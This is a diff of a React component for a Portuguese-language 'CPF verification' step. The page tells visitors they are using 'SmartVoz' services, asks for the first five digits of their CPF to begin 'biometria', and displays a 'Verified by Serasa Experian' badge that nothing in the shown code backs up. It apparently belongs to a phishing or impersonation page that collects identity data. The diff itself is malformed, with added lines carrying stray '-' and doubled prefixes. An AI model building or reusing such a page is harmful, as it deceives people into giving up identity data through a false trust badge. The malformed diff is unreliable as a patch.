@@ -59,77 +59,91 @@ export const CpfVerificationStep = ({ onNext }: CpfVerificationStepProps) => {
   };
 
   return (
-    <div className="h-screen bg-white text-gray-800 flex flex-col overflow-hidden">
-      <div className="flex-1 flex items-start justify-center pt-32 p-6">
-        <div className="w-full max-w-[280px] bg-transparent rounded-lg space-y-3">
-          <h2 className="text-xs font-bold text-gray-800 max-w-[280px] mx-auto text-center">
-            Olá, verificamos que você está realizando a 
-            <br />
-            consulta/contratação dos nossos serviços SmartVoz.
-            <br />
-            Para dar continuidade precisamos realizar a sua biometria.
-          </h2>
-          
-          <p className="text-xs text-gray-600 text-center mt-2 max-w-[280px] mx-auto">
-            Biometria é uma solução que utiliza a tecnologia para identificação do cliente.
-          </p>
-          
-          <form onSubmit={handleSubmit} className="space-y-3">
-            <div className="space-y-2">
-              <label htmlFor="cpf" className="block text-xs font-bold text-center text-gray-800">
-                Insira os primeiros 5 dígitos do seu CPF:
-              </label>
-              <Input
-                id="cpf"
-                type="text"
-                value={cpfDigits}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '').slice(0, 5);
-                  setCpfDigits(value);
-                }}
-                placeholder=""
-                className="w-full h-9 text-black text-center text-base bg-white border border-gray-300"
-                maxLength={5}
-              />
-            </div>
-
-            <div className="flex justify-center">
-              <ReCAPTCHA
-                sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"
-                onChange={(value) => setCaptchaValue(value)}
-                theme="light"
-                style={{ transform: "scale(0.85)", transformOrigin: "center center" }}
-              />
-            </div>
-
-            <div className="flex justify-center mt-4">
-              <div className="flex flex-col items-center bg-transparent px-4 py-2 rounded-lg">
-                <div className="flex items-center">
-                  <div className="h-5 w-[1px] bg-gray-400 mr-2"></div>
-                  <Lock className="w-5 h-5 text-gray-600" strokeWidth={2.5} />
-                </div>
-                <div className="text-center ml-[6px]">
-                  <span className="text-sm text-[#8425af] block">Verified by</span>
-                  <span className="font-semibold text-sm text-gray-800 ml-8 -mt-[2px]">Serasa Experian</span>
-                </div>
-              </div>
-            </div>
-          </form>
-        </div>
-      </div>
-      
-      {/* Botão fixo no rodapé cobrindo toda a largura */}
-      <div className="p-0">
-        <Button 
-          onClick={handleSubmit}
-          className="w-full h-16 bg-[#8425af] text-white hover:bg-[#7a1fa2] font-medium uppercase text-base tracking-wider rounded-none"
-          disabled={isLoading || !captchaValue || cpfDigits.length < 5}
-        >
-          {isLoading ? "VALIDANDO..." : "VALIDAR"}
-        </Button>
-      </div>
-    </div>
-  );
-};
-
-export default CpfVerificationStep;
+-    <div className="h-screen bg-white text-gray-800 flex flex-col overflow-hidden">
+-      <div className="flex-1 flex items-start justify-center pt-32 p-6">
+-        <div className="w-full max-w-[280px] bg-transparent rounded-lg space-y-3">
++    <div className="h-screen bg-white text-gray-800 flex flex-col overflow-hidden">
++      <div className="flex-1 flex items-start justify-center pt-10 px-3 pb-0 overflow-hidden">
++        <div className="w-full max-w-[280px] bg-transparent rounded-lg space-y-3">
+           <h2 className="text-xs font-bold text-gray-800 max-w-[280px] mx-auto text-center">
+             Olá, verificamos que você está realizando a 
+             <br />
+             consulta/contratação dos nossos serviços SmartVoz.
+             <br />
+             Para dar continuidade precisamos realizar a sua biometria.
+           </h2>
+           
+           <p className="text-xs text-gray-600 text-center mt-2 max-w-[280px] mx-auto">
+             Biometria é uma solução que utiliza a tecnologia para identificação do cliente.
+           </p>
+           
+           <form onSubmit={handleSubmit} className="space-y-3">
+             <div className="space-y-2">
+               <label htmlFor="cpf" className="block text-xs font-bold text-center text-gray-800">
+                 Insira os primeiros 5 dígitos do seu CPF:
+               </label>
+               <Input
+                 id="cpf"
+                 type="text"
+                 value={cpfDigits}
+                 onChange={(e) => {
+                   const value = e.target.value.replace(/\D/g, '').slice(0, 5);
+                   setCpfDigits(value);
+                 }}
+                 placeholder=""
+                 className="w-full h-9 text-black text-center text-base bg-white border border-gray-300"
+                 maxLength={5}
+               />
+             </div>
+ 
+             <div className="flex justify-center">
+               <ReCAPTCHA
+                 sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"
+                 onChange={(value) => setCaptchaValue(value)}
+                 theme="light"
+                 style={{ transform: "scale(0.85)", transformOrigin: "center center" }}
+               />
+             </div>
+ 
+             <div className="flex justify-center mt-4">
+               <div className="flex flex-col items-center bg-transparent px-4 py-2 rounded-lg">
+                 <div className="flex items-center">
+                   <div className="h-5 w-[1px] bg-gray-400 mr-2"></div>
+                   <Lock className="w-5 h-5 text-gray-600" strokeWidth={2.5} />
+                 </div>
+                 <div className="text-center ml-[6px]">
+                   <span className="text-sm text-[#8425af] block">Verified by</span>
+                   <span className="font-semibold text-sm text-gray-800 ml-8 -mt-[2px]">Serasa Experian</span>
+                 </div>
+               </div>
+             </div>
+           </form>
+         </div>
+       </div>
+       
+-      {/* Botão fixo no rodapé cobrindo toda a largura */}
+-      <div className="p-0">
+-        <Button 
+-          onClick={handleSubmit}
+-          className="w-full h-16 bg-[#8425af] text-white hover:bg-[#7a1fa2] font-medium uppercase text-base tracking-wider rounded-none"
+-          disabled={isLoading || !captchaValue || cpfDigits.length < 5}
+-        >
+-          {isLoading ? "VALIDANDO..." : "VALIDAR"}
+-        </Button>
+-      </div>
++      {/* Botão fixo no rodapé cobrindo toda a largura com zero padding */}
++      <div className="p-0 w-full">
++        <Button
++          onClick={handleSubmit}
++          className="w-full h-16 bg-[#8425af] text-white hover:bg-[#7a1fa2] font-medium uppercase text-base tracking-wider rounded-none"
++          style={{ borderRadius: 0 }}
++          disabled={isLoading || !captchaValue || cpfDigits.length < 5}
++        >
++          {isLoading ? "VALIDANDO..." : "VALIDAR"}
++        </Button>
++      </div>
+     </div>
+   );
+ };
+ 
+ export default CpfVerificationStep;
